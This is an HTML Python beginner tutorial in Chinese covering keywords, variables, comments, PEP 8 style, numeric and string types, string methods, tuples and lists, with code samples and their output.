<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印关键字列表</span></span><br><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)</span><br><span class="line"><span class="comment"># 关键字输出结果</span></span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;__peg_parser__&#x27;</span>,<span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看关键字帮助</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">help</span>(<span class="string">&quot;if&quot;</span>))</span><br></pre></td></tr></table></figure>
<h3 id="定义变量">定义变量</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">变量名 = 数据</span><br></pre></td></tr></table></figure>
<p>等号表示赋值运算符，两端有空格是开发规范，可以没有。</p>
<p>定义变量示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name  =  <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">age = <span class="number">35</span></span><br><span class="line">is_man = <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印单个变量值，print()是一个输出函数，类似Linux里echo</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"><span class="built_in">print</span>(age)</span><br><span class="line"><span class="comment"># 打印多个变量值,多个变量用逗号隔开</span></span><br><span class="line"><span class="built_in">print</span>(name, age, is_man)</span><br></pre></td></tr></table></figure>
<h3 id="注释">注释</h3>
<p>注释是编写程序时，程序员对一个语句、程序段、函数等的解释或提示，可提高程序代码可读性；</p>
<p>合理的代码注释应该占源代码的1/4左右，注释内容不会被解释器执行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释信息：以#号开头，后面留一个空格</span></span><br><span class="line"><span class="comment"># 这里就是单行注释，以#开头,后面整行都不会被解释器执行</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am Corazon teacher.&quot;</span>)  <span class="comment"># 表示打印输出</span></span><br><span class="line">-- 在程序尾部注释，“<span class="comment">#”前至少有两个空格</span></span><br><span class="line"><span class="comment"># 多行注释信息：包含在3个双引号或者3个单引号内的语句</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里就是多行注释</span></span><br><span class="line"><span class="string">三个引号里面的任何内容不会被解释器执行</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">或者</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这里就是多行注释</span></span><br><span class="line"><span class="string">三个引号里面的任何内容不会被解释器执行</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="python代码编写语法规范">python代码编写语法规范</h2>
<h3 id="代码语句分隔符号">代码语句分隔符号</h3>
<p>Python使用分号，用于一条语句的结束标识，如果是一行结尾，可用换行来替代分号。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python使用分号，用于一条语句的结束标识，如果是一行结尾，可用换行来替代分号。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用分号作为语句分隔符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am&quot;</span>);<span class="built_in">print</span>(<span class="string">&quot;Corazon&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用换行作为语句分隔符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I am&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Corazon&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="代码语句缩进要求">代码语句缩进要求</h3>
<p>Java、C 语言采用大括号“{}”分隔代码块，而Python 采用冒号“:”和“代码缩进”和来区分代码块之间的层次;对于类、函数、流程控制语句、异常处理语句等，行尾的冒号和下一行的缩进，表示下一个代码块的开始;而缩进的结束则表示此代码块的结束。</p>
<p>Python 中可使用空格或者Tab键实现，但无论是手动敲空格，还是使用 Tab 键，通常情况下都是采用 4 个空格长度作为一个缩进量;</p>
<p>默认情况下，一个 Tab 键就是4 个空格。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请你输入一个数字: &quot;</span>))</span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你输入的数字是&quot;</span>, i, <span class="string">&quot;，大于5，&quot;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你输入的数字是&quot;</span>, i, <span class="string">&quot;，小于5，&quot;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="代码语法规范补充">代码语法规范补充</h3>
<p>Python 采用 PEP 8 作为编码规范，其中 PEP 是 Python Enhancement Proposal（Python 增强建议书）的缩写;8 代表的是 Python 代码的样式指南。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>下面仅给大家列出 PEP 8 中初学者应严格遵守的一些编写规则：</p>
</li>
<li class="lvl-2">
<p>不要在行尾添加分号&quot;;&quot;</p>
</li>
<li class="lvl-2">
<p>不要用分号将两条命令放在同一行;</p>
</li>
<li class="lvl-2">
<p>在运算符两侧、函数参数之间以及逗号两侧，都使用空格分隔;</p>
</li>
<li class="lvl-2">
<p>使用必要的空行可以增加代码的可读性，通常在顶级定义（如函数或类的定义）之间空两行，而方法定义之间空一行;</p>
</li>
<li class="lvl-2">
<p>另外在用于分隔某些功能的位置也可以空一行。</p>
</li>
<li class="lvl-2">
<p>python中有些特殊语句指令结尾，需要加入：</p>
</li>
</ul>
<h2 id="python数据类型介绍">python数据类型介绍</h2>
<p>在python开发过程中，可以将数据类型分为两个大类：</p>
<p>python基本数据类型：字符串 数值型(整型 布尔型) 浮点型</p>
<p>python复合数据类型：元组、列表、字典、集合</p>
<h3 id="数据类型之数字类型介绍">数据类型之数字类型介绍</h3>
<h4 id="整数类型">整数类型</h4>
<p>python中的整型，即int类型，Python中没有对整型数字大小限制；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 整数类型示例</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(x) <span class="comment">#   输出x的值    </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x))  <span class="comment">#打印类型，type()函数用于输出变量的类型</span></span><br><span class="line"><span class="comment"># 将不同进制数转成十进制</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">0x11</span>, <span class="number">0b101</span>, <span class="number">0O12</span>, <span class="number">20</span>)</span><br><span class="line"><span class="comment">#为实现进制数互相转换，Python中内置了用于转换的函数：</span></span><br><span class="line">y = <span class="number">0b10001</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(y),<span class="built_in">oct</span>(y),<span class="built_in">int</span>(y),<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="number">17</span> <span class="number">5</span> <span class="number">10</span> <span class="number">20</span></span><br><span class="line"><span class="number">0b10001</span> <span class="number">0o21</span> <span class="number">17</span> <span class="number">0x11</span></span><br></pre></td></tr></table></figure>
<h4 id="浮点类型">浮点类型</h4>
<p>在python中小数都属于浮点型(float）,有两种表现形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 小数点形式（常用），较小的小数表示</span></span><br><span class="line">f =  <span class="number">3.14</span></span><br><span class="line">num1 = <span class="number">3.1415926</span> + <span class="number">3.1415926</span></span><br><span class="line">x = <span class="number">1</span></span><br><span class="line">y = <span class="string">&quot;Corazon&quot;</span></span><br><span class="line">f1 =  -<span class="number">3.14E2</span>  <span class="comment"># 指数形式： aEn 或 aen，较大的小数表示</span></span><br><span class="line">f2 =  <span class="number">3.14e-2</span>  <span class="comment"># 指数形式： aEn 或 aen，较大的小数表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;f:&quot;</span>,<span class="built_in">type</span>(f))</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">3.1415926</span>+<span class="number">3.1415926</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;x:&quot;</span>,<span class="built_in">type</span>(x), <span class="string">&quot;y:&quot;</span>,<span class="built_in">type</span>(y))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;f1:&quot;</span>,<span class="built_in">type</span>(f1),<span class="string">&quot;f2:&quot;</span>,<span class="built_in">type</span>(f2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">f: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br><span class="line"><span class="number">6.2831852</span></span><br><span class="line"><span class="number">6.2831852</span></span><br><span class="line">x: &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt; y: &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">f1: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt; f2: &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="布尔类型">布尔类型</h4>
<p>布尔型（Bool）是一种特殊数据类型，常用于判断，这种类型只有两种值，即&quot;真&quot;与&quot;假&quot;。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">4</span> == <span class="number">2</span>,<span class="number">5</span> &gt; <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 也可以做字符判断   --判断大小 依据ascii编码</span></span><br><span class="line">name = <span class="string">&quot;zhangsan&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name == <span class="string">&quot;lisi&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="literal">False</span> <span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不光上面代码语句的结果是布尔值，单独一个数据没有进行计算也可以都有自己的布尔值，这就涉及到布尔的零值。</span></span><br><span class="line"><span class="comment"># 任意数据类型都有一个具体值的布尔值为False,我们称为零值。该类型的其他值的布尔值皆为True。</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="string">&quot;Cozrzon&quot;</span>),<span class="built_in">bool</span>(<span class="number">0</span>)) <span class="comment"># 字符串的零值True False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="number">24</span>),<span class="built_in">bool</span>(<span class="number">0</span>))        <span class="comment"># 整型的零值  True False</span></span><br></pre></td></tr></table></figure>
<h4 id="数据类型间相互转换方法">数据类型间相互转换方法</h4>
<p>python内置了进行转换数据类型的函数，常见有int()、float()，示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># int() 转成整型</span></span><br><span class="line"><span class="comment"># float() 转成小数</span></span><br><span class="line">x = <span class="number">3</span></span><br><span class="line">y = <span class="number">3.14</span></span><br><span class="line"><span class="comment">#注意：浮点型转换为整数型时直接舍去小数部分（向下取整）</span></span><br><span class="line"><span class="built_in">print</span>(x, <span class="built_in">type</span>(x), y, <span class="built_in">type</span>(y))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(x), <span class="built_in">type</span>(<span class="built_in">float</span>(x)), <span class="built_in">int</span>(y), <span class="built_in">type</span>(<span class="built_in">int</span>(y)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行结果</span></span><br><span class="line"><span class="number">3</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt; <span class="number">3.14</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br><span class="line"><span class="number">3.0</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt; <span class="number">3</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="数据类型值字符类型介绍">数据类型值字符类型介绍</h3>
<h4 id="字符串格式">字符串格式</h4>
<p>单行字符串：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用双引号，直接输出字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hi,Corazon&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以变量的形式输出字符串，采用单引号定义</span></span><br><span class="line">s1 = <span class="string">&#x27;hi,Corazon&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure>
<p>多行字符串也叫文本字符串，就是三个单引号或者三个双引号圈住的内容，实际上也是字符串；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">s1 = &quot;hi,boy\nhi,girl&quot;</span></span><br><span class="line"><span class="string">s2 = &#x27;I\&#x27;m Corazon&#x27;</span></span><br><span class="line"><span class="string">s3 = &quot;D:\\中科人才\\python.exe&quot;</span></span><br><span class="line"><span class="string">s4 = &quot;我是中科人才，\</span></span><br><span class="line"><span class="string">我喜欢python&quot;</span></span><br><span class="line"><span class="string">长字符串中放置单引号或者双引号不会导致解析错误</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line">s1 = <span class="string">&quot;hi,boy</span></span><br><span class="line"><span class="string">hi,girl&quot;</span></span><br><span class="line">s2 = <span class="string">&#x27;I&#x27;</span>m Corazon<span class="string">&#x27;</span></span><br><span class="line"><span class="string">s3 = &quot;D:\中科人才\python.exe&quot;</span></span><br><span class="line"><span class="string">s4 = &quot;我是中科人才，我喜欢python&quot;</span></span><br><span class="line"><span class="string">长字符串中放置单引号或者双引号不会导致解析错误</span></span><br></pre></td></tr></table></figure>
<h4 id="字符串信息转义设置">字符串信息转义设置</h4>
<p>有些特殊字符信息前面加\ 转义字符会有特殊的含义作用：</p>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>说明</th>
<th>转义字符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>\n</td>
<td>换行符，将光标位置移到下一行开头</td>
<td>\r</td>
<td>回车符，将光标位置移到本行开头</td>
</tr>
<tr>
<td>\t</td>
<td>水平制表符，也即 Tab 键，一般相当于四个空格</td>
<td>\b</td>
<td>退格（Backspace），将光标位置移到前一列</td>
</tr>
<tr>
<td>\任意字符</td>
<td>转义，例如<code>'</code>，<code>&quot;</code>,<code> \</code>等</td>
<td>行尾\</td>
<td>不换行，多行编辑一行输出</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        代码操作示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 索引取值</span></span><br><span class="line">s = <span class="string">&quot;hello，Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">1</span>])  <span class="comment"># 索引从前到后，从0开始，1对应的字符为e</span></span><br><span class="line"><span class="built_in">print</span>(s[-<span class="number">3</span>])  <span class="comment"># 索引从后到前，从-1开始，-3为倒数第三个字符，对应的字符为k</span></span><br><span class="line"><span class="comment"># 02 切片取值：序列类型对象[start : end : step]</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">2</span>:<span class="number">5</span>])  <span class="comment"># llo     ：取索引1到索引3（左闭右开） == [1:3)</span></span><br><span class="line"><span class="built_in">print</span>(s[:<span class="number">5</span>])  <span class="comment"># hello   ：start缺省，默认从0取</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">6</span>:])  <span class="comment"># Corazon ：end缺省，默认取到最后</span></span><br><span class="line"><span class="comment"># 03 判断存在：使用in关键字检查某元素是否为序列的成员。</span></span><br><span class="line">s = <span class="string">&quot;hello,Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Corazon&quot;</span> <span class="keyword">in</span> s)  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Leonidas&quot;</span> <span class="keyword">in</span> s)  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 04 +/*运算：支持使用“+”运算符做相加操作，它会将两个序列进行连接，但不会去除重复的元素。</span></span><br><span class="line"><span class="comment">#            使用数字 n 乘以一个序列会生成新的序列，其内容为原来序列被重复 n 次的结果。</span></span><br><span class="line">s = <span class="string">&quot;hello&quot;</span> + <span class="string">&quot;Corazon&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s)  <span class="comment"># 输出helloCorazon</span></span><br><span class="line">s = <span class="string">&quot;hello&quot;</span> + <span class="string">&quot;,Corazon!!!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;*&quot;</span> * <span class="number">30</span>)  <span class="comment"># 输出30个*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line">e</span><br><span class="line">z</span><br><span class="line">llo</span><br><span class="line">hello</span><br><span class="line">Corazon</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">helloCorazon</span><br><span class="line">hello,Corazon!!!hello,Corazon!!!</span><br><span class="line">******************************</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="字符串内置方法">字符串内置方法</h4>
<p>在对字符串进行操作时，还会存在一些内置的方法函数，完成对字符串信息的特殊需求处理：</p>
<table>
<thead>
<tr>
<th><strong>方法</strong></th>
<th><strong>作用</strong></th>
<th><strong>示例</strong></th>
<th><strong>输出</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>upper</code></td>
<td>大写</td>
<td><code>&quot;hello&quot;.upper()</code></td>
<td><code>&quot;HELLO&quot;</code></td>
</tr>
<tr>
<td><code>lower</code></td>
<td>小写</td>
<td><code>&quot;Hello&quot;.lower()</code></td>
<td><code>&quot;hello&quot;</code></td>
</tr>
<tr>
<td><code>startswith()</code></td>
<td>是否以a开头</td>
<td><code>&quot;Corazon&quot;.startswith(&quot;a&quot;)</code></td>
<td><code>True</code></td>
</tr>
<tr>
<td><code>endswith()</code></td>
<td>是否以a结尾</td>
<td><code>&quot;Corazon&quot;.endswith(&quot;a&quot;)</code></td>
<td><code>False</code></td>
</tr>
<tr>
<td><strong><code>isdigit()</code></strong></td>
<td>是否全数字</td>
<td><code>'123'.isdigit()</code></td>
<td><code>True</code></td>
</tr>
<tr>
<td><code>isalpha()</code></td>
<td>是否全字母</td>
<td><code>'Corazon123'.isalpha()</code></td>
<td><code>False</code></td>
</tr>
<tr>
<td><code>isalnum()</code></td>
<td>是否全为字母或数字</td>
<td><code>'Corazon123'.isalnum()</code></td>
<td><code>True</code></td>
</tr>
<tr>
<td><code>strip()</code></td>
<td>去两边空格</td>
<td><code>&quot; hi Corazon \n&quot;.strip()</code></td>
<td><code>&quot;hi Corazon&quot;</code></td>
</tr>
<tr>
<td><strong><code>join()</code></strong></td>
<td>多字符串连接</td>
<td><code>&quot;-&quot;.join([&quot;Corazon&quot;,&quot;eric&quot;])</code></td>
<td><code>&quot;Corazon-eric&quot;</code></td>
</tr>
<tr>
<td><strong><code>split()</code></strong></td>
<td>分割字符串，默认空格</td>
<td><code>&quot;Corazon-eric&quot;.split(&quot;-&quot;)</code></td>
<td><code>['Corazon', 'eric']</code></td>
</tr>
<tr>
<td><strong><code>find()</code></strong></td>
<td>返回指定字符串索引，没有返回-1</td>
<td><code>&quot;world&quot;.find(&quot;w&quot;)</code></td>
<td>0</td>
</tr>
<tr>
<td><strong><code>index()</code></strong></td>
<td>返回指定字符串索引，找不到会报错</td>
<td><code>&quot;world&quot;.index(&quot;w&quot;)</code></td>
<td>0</td>
</tr>
<tr>
<td><strong><code>count()</code></strong></td>
<td>统计指定字符串出现次数</td>
<td><code>&quot;world&quot;.count(&quot;l&quot;)</code></td>
<td>1</td>
</tr>
<tr>
<td><strong><code>len(s)</code></strong></td>
<td>返回字符串长度</td>
<td><code>len(&quot;Hello,Corazon!!!&quot;))</code></td>
<td>16</td>
</tr>
<tr>
<td><strong><code>replace()</code></strong></td>
<td>替换old为new</td>
<td><code>'oldold'.replace('old','new',1)</code><br>‘oldold’.replace(‘old’,‘new’)</td>
<td><code>newold</code><br><code>newnew</code></td>
</tr>
<tr>
<td><code>format()</code></td>
<td>格式化方法</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p><font class="notice">注意：index()和find()方法只能匹配首个指定字符的索引</font></p>
<h3 id="复合数据类型"><strong>复合数据类型</strong></h3>
<h4 id="元组数据类型"><strong>元组数据类型</strong></h4>
<p><strong>元组数据类型定义：</strong></p>
<p>元组的元素只能读，不能进行修改（下标不能改 元素不能改 长度不能增加 但整体可以改），通常情况下，元组用于保存无需修改的内容；元组使用小括号表示声明（定义）一个元素数据类型：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(element1, element2, element3, ..., elementn)</span><br></pre></td></tr></table></figure>
<p><font class="notice">注意：当创建的元组中只有一个字符串类型的元素时，该元素后面必须要加一个逗号，否则python解释器会将它视为字符串 </font></p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        代码操作示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(l,<span class="built_in">type</span>(l)) <span class="comment"># (1, 2, 3) &lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">pen = (<span class="string">&quot;pear1&quot;</span>, <span class="string">&quot;pear2&quot;</span>, <span class="string">&quot;pear3&quot;</span>)  <span class="comment"># 小括号</span></span><br><span class="line"><span class="comment"># 打印元组所有元素</span></span><br><span class="line"><span class="built_in">print</span>(pen)</span><br></pre></td></tr></table></figure>

    </div>
</div>
<p><strong>02</strong> <strong>元组数据序列操作：</strong></p>
<p>元组数据信息调取和列表操作基本一致，支持索引和切片操作。</p>
<div class="spoiler collapsed">
    <div class="spoiler-title">
        代码操作示例
    </div>
    <div class="spoiler-content">
        <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = (<span class="string">&quot;element1&quot;</span>, <span class="string">&quot;element2&quot;</span>, <span class="string">&quot;element3&quot;</span>, <span class="string">&quot;element4&quot;</span>, <span class="string">&quot;element5&quot;</span>, <span class="string">&quot;element6&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>])  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片操作</span></span><br><span class="line"><span class="built_in">print</span>(l[<span class="number">2</span>:<span class="number">4</span>])  <span class="comment"># (3, 4)  也是前闭后开 [2:4)</span></span><br><span class="line"><span class="built_in">print</span>(l[:<span class="number">4</span>])  <span class="comment"># (1, 2, 3, 4)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;element2&quot;</span> <span class="keyword">in</span> l)  <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表信息循环遍历：</span></span><br><span class="line">pen = (<span class="string">&quot;pear1&quot;</span>, <span class="string">&quot;pear2&quot;</span>, <span class="string">&quot;pear3&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> pen:</span><br><span class="line">    <span class="built_in">print</span>(item,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n--------分隔符-------&quot;</span>)</span><br><span class="line"><span class="comment">#整体可以改</span></span><br><span class="line">pen = (<span class="string">&quot;pear1&quot;</span>, <span class="string">&quot;pear2&quot;</span>, <span class="string">&quot;pear3&quot;</span>,<span class="string">&quot;pear4&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> pen:</span><br><span class="line">    <span class="keyword">if</span> item.find(<span class="string">&quot;4&quot;</span>) &gt;= <span class="number">0</span>:  <span class="comment"># 字符串查找用法  find 返回字符串位置</span></span><br><span class="line">        <span class="built_in">print</span>(item + <span class="string">&quot;这是第4个梨&quot;</span>)  <span class="comment"># 字符串相连用法</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行结果</span></span><br><span class="line">element3</span><br><span class="line">(<span class="string">&#x27;element3&#x27;</span>, <span class="string">&#x27;element4&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;element1&#x27;</span>, <span class="string">&#x27;element2&#x27;</span>, <span class="string">&#x27;element3&#x27;</span>, <span class="string">&#x27;element4&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">pear1 pear2 pear3 </span><br><span class="line">--------分隔符-------</span><br><span class="line">pear1</span><br><span class="line">pear2</span><br><span class="line">pear3</span><br><span class="line">pear4这是第<span class="number">4</span>个梨</span><br><span class="line">---------------</span><br></pre></td></tr></table></figure>

    </div>
</div>
<h4 id="列表数据类型"><strong>列表数据类型</strong></h4>
<p>列表会将所有元素都放在一对中括号[]里面，相邻元素之间用逗号分隔，具体表现形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[element1, element2, element3, ..., elementn]</span><br></pre></td></tr></table></figure>
<p><font class="notice">注意：不同于C，java等语言中的数组，python的列表可以存放不同的任意数据类型对象。 </font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">123</span>,<span class="string">&quot;zkrc&quot;</span>,<span class="literal">True</span>]</span><br><span class="line"><span class="built_in">print</span>(l,<span class="built_in">type</span>(l),<span class="built_in">len</span>(l))</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> l:</span><br><span class="line">    <span class="built_in">print</span>(item,<span class="built_in">type</span>(item))</span><br><span class="line"><span class="comment"># 执行结果</span></span><br><span class="line">[<span class="number">123</span>, <span class="string">&#x27;zkrc&#x27;</span>, <span class="literal">True</span>] &lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt; <span class="number">3</span></span><br><span class="line"><span class="number">123</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line">zkrc &lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="literal">True</span> &lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列表方式赋值变量 --列表值与变量数量要一一对应</span></span><br><span class="line">a,b = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">a,b = [<span class="built_in">input</span>(<span class="string">&quot;请输入第一个字符: &quot;</span>),<span class="built_in">input</span>(<span class="string">&quot;请输入第二个字符: &quot;</span>)]</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br></pre></td></tr></table></figure>
<p><strong>列表数据信息调取</strong></p>
<p>我们可以使用索引（index）访问列表中的某个元素，也可以使用切片操作访问列表中的一组元素值信息，从而得到的是一个新的子列表。</p>
